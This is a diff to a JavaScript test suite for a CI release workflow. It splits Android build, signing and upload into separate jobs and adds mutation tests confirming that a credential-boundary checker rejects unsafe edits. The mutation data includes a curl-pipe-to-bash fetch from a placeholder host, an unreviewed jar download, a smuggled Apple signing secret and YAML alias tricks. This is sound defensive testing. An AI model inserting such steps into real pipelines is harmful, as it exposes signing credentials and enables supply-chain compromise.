@@ -127,9 +127,66 @@ env:
 jobs:
   prepare:
     steps: []
-  android:
-    env:
-      KEYSTORE: \${{ secrets.ANDROID_KEYSTORE_BASE64 }}
+  android-build:
+    steps:
+      - uses: actions/checkout@sha
+      - run: scripts/assert-no-android-credentials.sh
+      - run: npm ci
+      - run: |
+          scripts/assert-no-android-credentials.sh
+          echo aarch64-linux-android,armv7-linux-androideabi,i686-linux-android,x86_64-linux-android
+          tauri android build --ci --aab -- --locked
+          jarsigner -verify app.aab
+          android-release-artifact.sh record app.aab
+          android-release-artifact.sh seal-verifier output bundletool.jar a099cfa1543f55593bc2ed16a70a7c67fe54b1747bb7301f37fdfd6d91028e29
+      - run: scripts/assert-no-android-credentials.sh
+      - uses: actions/attest-build-provenance@sha
+      - uses: actions/upload-artifact@sha
+        with:
+          name: unsigned-zuuli-android-fixture
+  android-sign-upload:
+    environment: zuuli-app-stores
+    steps:
+      - uses: actions/download-artifact@sha
+      - name: Verify source-bound artifact checksum and attestation
+        env:
+          GH_TOKEN: \${{ github.token }}
+        run: |
+          EXPECTED_PAYLOAD_SHA256=fixture
+          gh attestation verify unsigned-android/CHECKSUMS.sha256 --source-digest "$EXPECTED_SOURCE_SHA" --source-ref refs/heads/main
+          gh api "repos/$EXPECTED_REPOSITORY/git/commits/$EXPECTED_SOURCE_SHA" --jq .tree.sha
+      - name: Inspect attested Android artifact without credentials
+        run: |
+          echo bundletool-all-1.18.3.jar a099cfa1543f55593bc2ed16a70a7c67fe54b1747bb7301f37fdfd6d91028e29
+          java -jar "$bundletool" dump manifest --bundle="$aab"
+          echo arm64-v8a,armeabi-v7a,x86,x86_64
+          rm -f -- "$bundletool"
+      - name: Materialize and sign
+        env:
+          KEYSTORE_BASE64: \${{ secrets.ANDROID_KEYSTORE_BASE64 }}
+          KEYSTORE_PASSWORD: \${{ secrets.ANDROID_KEYSTORE_PASSWORD }}
+          KEY_ALIAS: \${{ secrets.ANDROID_KEY_ALIAS }}
+          KEY_PASSWORD: \${{ secrets.ANDROID_KEY_PASSWORD }}
+          SERVICE_ACCOUNT_BASE64: \${{ secrets.PLAY_SERVICE_ACCOUNT_JSON_BASE64 }}
+        run: |
+          jarsigner -keystore upload.jks app.aab alias
+          keytool -printcert -jarfile app.aab
+          echo signed-aab-payload.sha256
+          cmp "$RUNNER_TEMP/unsigned-aab-payload.sha256" signed
+          curl --retry 3 --retry-all-errors androidpublisher.googleapis.com
+      - name: Destroy ephemeral Android credentials
+        if: always()
+        run: echo destroyed
+      - uses: actions/upload-artifact@sha
+      - name: Destroy signed Android output
+        if: always()
+        run: echo destroyed
+  android-finalize:
+    steps:
+      - uses: actions/download-artifact@sha
+      - run: echo android-signed-universal-aab
+      - uses: actions/attest-build-provenance@sha
+      - uses: actions/upload-artifact@sha
 ${buildJob("ios-build", "tauri ios build --archive-only")}
 ${credentialJob("ios-sign", "xcodebuild -exportArchive")}
 ${finalizeJob("ios-verify")}
@@ -143,6 +200,14 @@ ${finalizeJob("macos-finalize")}
       credentials:
         password: \${{ secrets.GITHUB_TOKEN }}
   release-index:
+    needs: [prepare, android-build, android-sign-upload, android-finalize, ios-finalize, linux, macos-finalize]
+    if: >-
+      (needs.android-build.result == 'success' &&
+      needs.android-sign-upload.result == 'success' &&
+      needs.android-finalize.result == 'success') ||
+      (needs.android-build.result == 'skipped' &&
+      needs.android-sign-upload.result == 'skipped' &&
+      needs.android-finalize.result == 'skipped')
     steps: []
 `;
 
@@ -272,6 +337,164 @@ test("an explicit assertion guard aborts before credential work continues", () =
   assert.notEqual(result.status, 0);
   assert.match(result.stderr, /assertion rejected/);
   assert.doesNotMatch(result.stdout, /REACHED/);
+});
+
+const androidProtectedMutations = [
+  [
+    "checkout",
+    (source) => source.replace(
+      "      - uses: actions/download-artifact@37930b1c2abaa49bbe596cd826c3c89aef350131 # v7\n",
+      "      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1\n      - uses: actions/download-artifact@37930b1c2abaa49bbe596cd826c3c89aef350131 # v7\n",
+    ),
+  ],
+  [
+    "cache restore",
+    (source) => source.replace(
+      "      - uses: actions/download-artifact@37930b1c2abaa49bbe596cd826c3c89aef350131 # v7\n",
+      "      - uses: actions/cache@v4\n        with: { path: target, key: hostile }\n      - uses: actions/download-artifact@37930b1c2abaa49bbe596cd826c3c89aef350131 # v7\n",
+    ),
+  ],
+  [
+    "dependency setup",
+    (source) => source.replace(
+      "      - uses: actions/download-artifact@37930b1c2abaa49bbe596cd826c3c89aef350131 # v7\n",
+      "      - uses: actions/setup-node@v4\n      - uses: actions/download-artifact@37930b1c2abaa49bbe596cd826c3c89aef350131 # v7\n",
+    ),
+  ],
+  [
+    "second artifact download",
+    (source) => source.replace(
+      "          path: unsigned-android\n",
+      "          path: unsigned-android\n      - uses: actions/download-artifact@37930b1c2abaa49bbe596cd826c3c89aef350131\n        with: { pattern: '*', path: extra }\n",
+    ),
+  ],
+  [
+    "skipped source verification",
+    (source) => source.replace(
+      "      - name: Verify source-bound artifact checksum and attestation\n",
+      "      - name: Verify source-bound artifact checksum and attestation\n        if: false\n",
+    ),
+  ],
+  [
+    "soft-failed source verification",
+    (source) => source.replace(
+      "      - name: Verify source-bound artifact checksum and attestation\n",
+      "      - name: Verify source-bound artifact checksum and attestation\n        continue-on-error: true\n",
+    ),
+  ],
+  [
+    "skipped artifact inspection",
+    (source) => source.replace(
+      "      - name: Inspect attested Android artifact without credentials\n",
+      "      - name: Inspect attested Android artifact without credentials\n        if: false\n",
+    ),
+  ],
+  [
+    "soft-failed artifact inspection",
+    (source) => source.replace(
+      "      - name: Inspect attested Android artifact without credentials\n",
+      "      - name: Inspect attested Android artifact without credentials\n        continue-on-error: true\n",
+    ),
+  ],
+  [
+    "credential exposed before verification",
+    (source) => source.replace(
+      "          GH_TOKEN: ${{ github.token }}\n",
+      "          GH_TOKEN: ${{ github.token }}\n          KEYSTORE_BASE64: ${{ secrets.ANDROID_KEYSTORE_BASE64 }}\n",
+    ),
+  ],
+  [
+    "GitHub token exposed to artifact parser",
+    (source) => source.replace(
+      "      - name: Inspect attested Android artifact without credentials\n        env:\n          EXPECTED_IDENTITY: ${{ needs.prepare.outputs.identity }}\n",
+      "      - name: Inspect attested Android artifact without credentials\n        env:\n          EXPECTED_IDENTITY: ${{ needs.prepare.outputs.identity }}\n          GH_TOKEN: ${{ github.token }}\n",
+    ),
+  ],
+  [
+    "deleted provenance verification",
+    (source) => source.replace(
+      "          gh attestation verify unsigned-android/CHECKSUMS.sha256 \\\n",
+      "          true \\\n",
+    ),
+  ],
+  [
+    "dependency fetch before secret scope",
+    (source) => source.replace(
+      "      - name: Inspect attested Android artifact without credentials\n",
+      "      - name: Fetch an unreviewed verifier dependency\n        run: curl https://example.invalid/verifier.jar -o verifier.jar\n      - name: Inspect attested Android artifact without credentials\n",
+    ),
+  ],
+  [
+    "stale source accepted",
+    (source) => source.replace(
+      "and .source.sha == $source and .artifact.sha256 == $sha",
+      "and .artifact.sha256 == $sha",
+    ),
+  ],
+  [
+    "verifier tooling retained into secret scope",
+    (source) => source.replace('          rm -f -- "$bundletool" "$RUNNER_TEMP/current-aab-members.txt"\n', "          true\n"),
+  ],
+  [
+    "build command in credential scope",
+    (source) => source.replace(
+      "          umask 077\n",
+      "          umask 077\n          cargo build --release\n",
+    ),
+  ],
+  [
+    "dependency fetch in credential scope",
+    (source) => source.replace(
+      "          umask 077\n",
+      "          umask 077\n          curl https://example.invalid/dependency.sh | bash\n",
+    ),
+  ],
+  [
+    "retry expanded to token minting",
+    (source) => source.replace(
+      "            token=$(curl --fail --silent --show-error \\\n",
+      "            token=$(curl --fail --silent --show-error --retry 3 --retry-all-errors \\\n",
+    ),
+  ],
+  [
+    "skipped credential cleanup",
+    (source) => source.replace(
+      "      - name: Destroy ephemeral Android credentials\n        if: always()\n",
+      "      - name: Destroy ephemeral Android credentials\n        if: false\n",
+    ),
+  ],
+  [
+    "soft-failed credential cleanup",
+    (source) => source.replace(
+      "      - name: Destroy ephemeral Android credentials\n        if: always()\n",
+      "      - name: Destroy ephemeral Android credentials\n        if: always()\n        continue-on-error: true\n",
+    ),
+  ],
+  [
+    "skipped signed-output cleanup",
+    (source) => source.replace(
+      "      - name: Destroy signed Android output\n        if: always()\n",
+      "      - name: Destroy signed Android output\n        if: false\n",
+    ),
+  ],
+  [
+    "release index accepts a skipped protected signer for an Android target",
+    (source) => source.replace(
+      "      needs.android-sign-upload.result == 'success' &&\n",
+      "      needs.android-sign-upload.result == 'skipped' &&\n",
+    ),
+  ],
+];
+
+test("current Android protected program rejects boundary mutations", async () => {
+  const workflow = await readFile(protectedReleaseWorkflow, "utf8");
+  assert.deepEqual(verifyAppleCredentialBoundary(workflow), []);
+  for (const [label, mutate] of androidProtectedMutations) {
+    const mutated = mutate(workflow);
+    assert.notEqual(mutated, workflow, `${label} mutation did not apply`);
+    const failures = verifyAppleCredentialBoundary(mutated);
+    assert.ok(failures.length > 0, `${label} mutation escaped the protected-job policy`);
+  }
 });
 
 const protectedReleaseWorkflow = new URL(
@@ -461,7 +684,7 @@ for (const [name, mutate, expected] of [
       "      - run: scripts/assert-no-apple-credentials.sh\n      - run: npm ci",
       "      - run: npm ci",
     ),
-    "ios-build must run the Apple credential canary before dependency install",
+    "ios-build must run the credential canary before dependency install",
   ],
   [
     "rejects a build without a post-build credential canary",
@@ -469,7 +692,7 @@ for (const [name, mutate, expected] of [
       "          shasum -a 256 ZUULI.xcarchive.zip ExportOptions.plist source-record.json > CHECKSUMS.sha256\n      - run: scripts/assert-no-apple-credentials.sh",
       "          shasum -a 256 ZUULI.xcarchive.zip ExportOptions.plist source-record.json > CHECKSUMS.sha256",
     ),
-    "ios-build must run the Apple credential canary after the unsigned build",
+    "ios-build must run the credential canary after the unsigned build",
   ],
   [
     "rejects source checkout in a signer",
@@ -477,7 +700,7 @@ for (const [name, mutate, expected] of [
       "      - uses: actions/download-artifact@sha\n",
       "      - uses: actions/checkout@sha\n      - uses: actions/download-artifact@sha\n",
     ),
-    "ios-sign contains forbidden \"actions/checkout@\"",
+    "android-sign-upload contains forbidden \"actions/checkout@\"",
   ],
   [
     "rejects a Tauri rebuild in a signer",
@@ -560,17 +783,17 @@ for (const [name, mutate, expected] of [
   [
     "rejects an Apple secret smuggled into the Android credential job",
     (source) => source.replace(
-      "      KEYSTORE: ${{ secrets.ANDROID_KEYSTORE_BASE64 }}\n",
-      "      KEYSTORE: ${{ secrets.ANDROID_KEYSTORE_BASE64 }}\n      APPLE_LEAK: ${{ secrets.ASC_KEY_BASE64 }}\n",
+      "          KEYSTORE_BASE64: ${{ secrets.ANDROID_KEYSTORE_BASE64 }}\n",
+      "          KEYSTORE_BASE64: ${{ secrets.ANDROID_KEYSTORE_BASE64 }}\n          APPLE_LEAK: ${{ secrets.ASC_KEY_BASE64 }}\n",
     ),
-    "android contains unauthorized secrets-context expression \"${{ secrets.ASC_KEY_BASE64 }}\"",
+    "android-sign-upload contains unauthorized secrets-context expression \"${{ secrets.ASC_KEY_BASE64 }}\"",
   ],
   [
     "rejects a flow anchor in Android aliased into the unsigned iOS build",
     (source) => source
       .replace(
-        "      KEYSTORE: ${{ secrets.ANDROID_KEYSTORE_BASE64 }}\n",
-        "      KEYSTORE: &apple ${{ secrets.ANDROID_KEYSTORE_BASE64 }}\n",
+        "          KEYSTORE_BASE64: ${{ secrets.ANDROID_KEYSTORE_BASE64 }}\n",
+        "          KEYSTORE_BASE64: &apple ${{ secrets.ANDROID_KEYSTORE_BASE64 }}\n",
       )
       .replace("  ios-build:\n", "  ios-build:\n    env: { APPLE_LEAK: *apple }\n"),
     "contains forbidden YAML alias",
@@ -583,8 +806,8 @@ for (const [name, mutate, expected] of [
     `rejects an actionlint-valid ${label} anchor and alias`,
     (source) => source
       .replace(
-        "      KEYSTORE: ${{ secrets.ANDROID_KEYSTORE_BASE64 }}\n",
-        `      KEYSTORE: &${anchor} \${{ secrets.ANDROID_KEYSTORE_BASE64 }}\n`,
+        "          KEYSTORE_BASE64: ${{ secrets.ANDROID_KEYSTORE_BASE64 }}\n",
+        `          KEYSTORE_BASE64: &${anchor} \${{ secrets.ANDROID_KEYSTORE_BASE64 }}\n`,
       )
       .replace("  ios-build:\n", `  ios-build:\n    env: { APPLE_LEAK: *${anchor} }\n`),
     "contains forbidden YAML",
@@ -617,8 +840,8 @@ for (const [name, mutate, expected] of [
     "does not mistake quoted hash and pipe text for a block scalar",
     (source) => source
       .replace(
-        "      KEYSTORE: ${{ secrets.ANDROID_KEYSTORE_BASE64 }}\n",
-        "      KEYSTORE: &apple ${{ secrets.ANDROID_KEYSTORE_BASE64 }}\n",
+        "          KEYSTORE_BASE64: ${{ secrets.ANDROID_KEYSTORE_BASE64 }}\n",
+        "          KEYSTORE_BASE64: &apple ${{ secrets.ANDROID_KEYSTORE_BASE64 }}\n",
       )
       .replace(
         "      - run: npm ci\n",
@@ -850,7 +1073,7 @@ for (const [name, mutate, expected] of [
       "      - uses: actions/download-artifact@sha\n",
       "      - uses: actions/download-artifact@sha\n        with: { path: attacker-controlled }\n",
     ),
-    "ios-sign credential execution program changed",
+    "android-sign-upload credential execution program changed",
   ],
   [
     "rejects credential-job defaults that replace the reviewed shell",
